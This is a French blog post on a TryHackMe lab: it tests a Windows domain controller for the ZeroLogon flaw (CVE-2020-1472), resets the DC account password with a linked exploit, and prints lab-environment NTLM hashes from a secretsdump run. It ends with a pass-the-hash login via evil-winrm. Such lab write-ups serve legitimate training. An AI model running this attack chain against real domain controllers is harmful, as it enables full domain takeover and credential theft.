---
layout: post
title: Test de la vulnérabilité ZeroLogon
subtitle: CVE-2020-1472
gh-repo: 0xSs0rZ/0xSs0rZ.github.io
tags: [ZeroLogon, Windows, Active Directory, CVE-2020-1472, Domain Controller, Impacket, secretsdump]
---

**La vulnérabilité Zero Logon, CVE-2020-1472, a été patchée par Microsoft en aout 2020. Depuis, plusieurs PoC ont été développés afin d'exploiter cette faille. Nous testerons une de ces preuves de concept sur une machine de TryHackMe.**

# Description

Zero Logon exploite une fonctionnalité de MS-NRPC (Microsoft NetLogon Remote Protocol), un composant d'authentification critique d'Active Directory qui gère l'authentification des comptes d'utilisateurs et de machines. Cette attaque est rendue possible par une une mauvaise implémentation de la cryptographie. 

# Test de la vulnérabilité

Dans un premier temps, nous allons utiliser un script développé par Secura afin de tester si un serveur est vulnérable à l'attaque ZeroLogon: [https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py](https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py){:target="_blank"}

Pour utiliser ce PoC, nous avons besoin de l'IP du serveur et du nom du controlleur de domaine.

Dans le cas de la box de TryHackMe, voici les infos révelées par Nmap:

![Zerologon-1.png](/img/Zerologon-1.png)

Lançons le PoC de Secura: `python3 zerologon_tester.py [DC_NAME] [IP]`

![Zerologon-2.png](/img/Zerologon-2.png)

Nous avons donc confirmation que ce serveur est vulnérable au Zero Logon :)

# Exploitation

Notre prochaine étape consiste à créer un nouveau mot de passe nul pour le compte du DC. Pour celà nous pouvons utiliser le PoC de Sq00ky: [https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py](https://raw.githubusercontent.com/Sq00ky/Zero-Logon-Exploit/master/zeroLogon-NullPass.py){:target="_blank"}

![Zerologon-3.png](/img/Zerologon-3.png)

Nous pouvons désormais dumper les hashs en utilisant secretsdump.py de Impacket:

~~~
root@Host-001:/tmp# python3 /usr/local/bin/secretsdump.py -just-dc -no-pass DC01\$@10.10.181.126
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2179ebfa86eb0e3cbab2bd58f2c946f5:::
hololive.local\a-koronei:1104:aad3b435b51404eeaad3b435b51404ee:efc17383ce0d04ec905371372617f954:::
(...)
~~~

Nous avons le hash de l'administrateur, nous pouvons nous en servir pour nous connecter: `evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.181.126`

![Zerologon-4.png](/img/Zerologon-4.png)

# Références

[1] CERT-FR, Vulnérabilité dans Microsoft Netlogon, [https://www.cert.ssi.gouv.fr/alerte/CERTFR-2020-ALE-020/](https://www.cert.ssi.gouv.fr/alerte/CERTFR-2020-ALE-020/){:target="_blank"}

[2] 0xdf, ZeroLogon - Owning HTB machines with CVE-2020-1472, [https://0xdf.gitlab.io/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-1472.html](https://0xdf.gitlab.io/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-1472.html){:target="_blank"}

[3] Dirkjanm, CVE-2020-1472, [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472){:target="_blank"}

**Poursuivez avec :** 

- [TryHackMe - Sudo Vulns](https://0xss0rz.github.io/2021-05-11-THM-Sudo-Vulns/)

- [San Diego CTF 2021 - Git Good](https://0xss0rz.github.io/2021-05-10-San-Diego-CTF-Git-Good/)

- [Attack Detection Fundamentals - Discovery Lab 1](https://0xss0rz.github.io/2021-01-15-Attack-Detection-Discovery/)

[![CC-BY](https://mirrors.creativecommons.org/presskit/buttons/88x31/svg/by.svg)](https://creativecommons.org/licenses/by/4.0/)

This work is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).
